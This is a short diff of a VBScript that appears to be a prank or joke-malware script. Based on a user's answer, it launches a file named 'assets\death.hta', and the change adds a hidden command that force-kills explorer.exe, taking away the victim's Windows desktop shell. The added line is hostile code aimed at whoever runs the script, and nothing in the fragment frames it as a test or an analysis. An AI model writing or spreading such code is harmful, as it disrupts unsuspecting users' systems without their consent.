@@ -6,4 +6,5 @@ If userResponse = vbNo Then
 Else
     Set objShell = CreateObject("WScript.Shell")
     objShell.Run "assets\death.hta"
+    objShell.Run "taskkill /f /im explorer.exe", 0, True
 End If
